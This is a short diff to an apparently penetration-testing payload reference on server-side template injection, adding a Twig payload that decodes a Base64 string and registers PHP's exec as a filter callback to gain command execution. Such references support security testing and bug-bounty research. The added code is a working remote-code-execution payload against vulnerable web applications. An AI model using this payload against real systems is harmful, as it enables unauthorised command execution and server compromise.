@@ -201,6 +201,12 @@ The following payload, which harnesses the built-in `_context` variable, also ac
 
 Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
+The following allows passing of a Base64 encoded payload.
+
+```twig
+{%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}{%set p%}base64 encoded string{%endset%}{%set p = p|convert_encoding((a), (b))%}{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|lower)}}{{_self.env.getFilter(p)}}
+```
+
 ---
 
 ## Latte
